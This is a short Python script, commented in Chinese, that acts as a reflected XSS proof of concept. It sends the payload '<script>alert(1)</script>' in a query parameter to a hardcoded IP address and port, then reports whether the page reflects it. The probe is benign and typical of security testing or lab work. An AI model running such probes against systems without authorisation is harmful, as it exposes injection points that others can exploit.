"""
XSS反射型 POC
url = 'http://120.25.24.45:31308/'
<script>alert(1)</script>
"""
import requests
def xss_verify(url):

    payload = "?message=<script>alert(1)</script>&submit=submit"

    res = requests.get(url+payload)
    # print(res.text)
    if "<script>alert(1)</script>" in res.text:
        print('%s 存在反射型XSS漏洞' %url)
    else:
        print('%s 不存在反射型XSS漏洞' % url)
if __name__ == '__main__':
    url = 'http://120.25.24.45:31308/'
    xss_verify(url)




